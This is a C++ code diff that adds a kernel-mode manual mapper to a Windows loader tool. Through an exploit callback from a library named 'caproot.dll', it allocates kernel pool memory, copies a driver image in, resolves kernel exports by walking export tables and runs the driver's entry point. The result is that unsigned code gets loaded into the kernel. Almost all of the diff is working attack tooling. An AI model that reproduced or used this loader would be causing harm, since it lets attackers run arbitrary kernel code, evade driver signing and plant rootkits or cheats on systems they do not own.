@@ -63,42 +63,148 @@ bool parse_cmdline(bool& is_kernel, std::wstring& image_path, std::wstring& proc
     image_path = *(image_path_arg + 1);
 
     auto proc_name_arg = std::find(arg_strs.begin(), arg_strs.end(), L"-proc_name");
-    if (proc_name_arg == arg_strs.end() || proc_name_arg + 1 == arg_strs.end())
-        return false;
-    proc_name = *(proc_name_arg + 1);
+    if (!is_kernel && proc_name_arg != arg_strs.end() && proc_name_arg + 1 != arg_strs.end())
+        proc_name = *(proc_name_arg + 1);
 
     return true;
 }
 
 bool kernel_map(const std::wstring& image_path) {
+    using func_MmGetSystemRoutineAddressFunc = PVOID(NTAPI*)(PUNICODE_STRING);
+    using func_root_func = std::function<VOID(func_MmGetSystemRoutineAddressFunc)>;
+    using func_exploit = bool(NTAPI*)(func_root_func);
+    using func_caproot_initialize = func_exploit(NTAPI*)();
+    using func_caproot_uninitialize = bool(NTAPI*)();
+    using func_ExAllocatePool = PVOID(*)(int, SIZE_T);
+    using func_ExFreePool = VOID(*)(PVOID);
+
+    // load caproot
+    auto caproot = LoadLibraryW(L"caproot.dll");
+    if (!caproot) {
+        printf("[-] caproot load failed\n");
+        return false;
+    }
+
+    // get procs
+    auto caproot_init = (func_caproot_initialize)GetProcAddress(caproot, "initialize");
+    auto caproot_uninit = (func_caproot_uninitialize)GetProcAddress(caproot, "uninitialize");
+    if (!caproot_init || !caproot_uninit) {
+        printf("[-] caproot get proc failed\n");
+        return false;
+    }
+
+    // init caproot
+    auto exploit = caproot_init();
+    if (!exploit) {
+        printf("[-] caproot init failed\n");
+        return false;
+    }
+
     // build mapper
     auto mapper = Mapper(image_path,
         // alloc
-        [](uint32_t size) {
+        [&](uint32_t size) {
             void* ret = nullptr;
+            exploit([&size, &ret](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                UNICODE_STRING func_name_uni = { 0 };
+                RtlInitUnicodeString(&func_name_uni, L"ExAllocatePool");
+                auto alloc_pool = (func_ExAllocatePool)get_system_routine(&func_name_uni);
+                if (alloc_pool) ret = alloc_pool(0, size);
+                return true;
+            });
             return ret;
         },
         // copy
-        [](void* payload, void* base, uint32_t size) {
-            return false;
+        [&](void* payload, void* base, uint32_t size) {
+            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                RtlCopyMemory(base, payload, size);
+                return true;
+            });
+            return true;
         },
         // free
-        [](void* base, uint32_t size) {
-            return;
+        [&](void* base, uint32_t size) {
+            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                UNICODE_STRING func_name_uni = { 0 };
+                RtlInitUnicodeString(&func_name_uni, L"ExFreePool");
+                auto free_pool = (func_ExFreePool)get_system_routine(&func_name_uni);
+                if (free_pool) free_pool(base);
+                return true;
+            });
         },
         // get_import_by_ordinal
-        [](char* module_name, uint16_t ordinal) {
+        [&](char* module_name, uint16_t ordinal) {
             uintptr_t ret = 0;
+            auto module_base = get_module_base_kernel(module_name);
+            if (!module_base) {
+                printf("[-] cannot find kernel module: %s\n", module_name);
+                return ret;
+            }
+
+            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                auto dos_header = (PIMAGE_DOS_HEADER)module_base;
+                if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+                    return false;
+                auto nt_headers = (PIMAGE_NT_HEADERS64)(module_base + dos_header->e_lfanew);
+                if (nt_headers->Signature != IMAGE_NT_SIGNATURE ||
+                    nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+                    return false;
+                auto export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base +
+                    nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+                auto at = (uint32_t*)(module_base + export_dir->AddressOfFunctions);
+                auto ot = (uint16_t*)(module_base + export_dir->AddressOfNameOrdinals);
+                for (ULONG i = 0; i < export_dir->NumberOfFunctions; i++) {
+                    if (ot[i] == ordinal) {
+                        ret = module_base + at[i];
+                        break;
+                    }
+                }
+                return true;
+            });
+
             return ret;
         },
         // get_import_by_name
-        [](char* module_name, char* method_name) {
+        [&](char* module_name, char* method_name) {
             uintptr_t ret = 0;
+            auto module_base = get_module_base_kernel(module_name);
+            if (!module_base) {
+                printf("[-] cannot find kernel module: %s\n", module_name);
+                return ret;
+            }
+
+            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                auto dos_header = (PIMAGE_DOS_HEADER)module_base;
+                if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+                    return false;
+                auto nt_headers = (PIMAGE_NT_HEADERS64)(module_base + dos_header->e_lfanew);
+                if (nt_headers->Signature != IMAGE_NT_SIGNATURE ||
+                    nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+                    return false;
+                auto export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base +
+                    nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+                auto at = (uint32_t*)(module_base + export_dir->AddressOfFunctions);
+                auto ot = (uint16_t*)(module_base + export_dir->AddressOfNameOrdinals);
+                auto nt = (uint32_t*)(module_base + export_dir->AddressOfNames);
+                for (ULONG i = 0; i < export_dir->NumberOfFunctions; i++) {
+                    auto func_name = (char*)(module_base + nt[i]);
+                    if (_stricmp(method_name, func_name) == 0) {
+                        ret = module_base + at[ot[i]];
+                        break;
+                    }
+                }
+                return true;
+            });
+
             return ret;
         },
         // run
-        [](void* mapping_base, void* entry_point) {
-            return true;
+        [&](void* mapping_base, void* entry_point) {
+            using func_DriverEntry = NTSTATUS(*)(PVOID, PVOID);
+            auto entry = (func_DriverEntry)entry_point;
+            return exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
+                return entry(mapping_base, nullptr) == 0;
+            });
         });
 
     // map
@@ -107,6 +213,13 @@ bool kernel_map(const std::wstring& image_path) {
         return false;
     }
 
+    // uninit caproot
+    if (!caproot_uninit()) {
+        printf("[-] caproot uninit failed\n");
+        return false;
+    }
+
+    printf("[+] map succeeded\n");
     return true;
 }
 
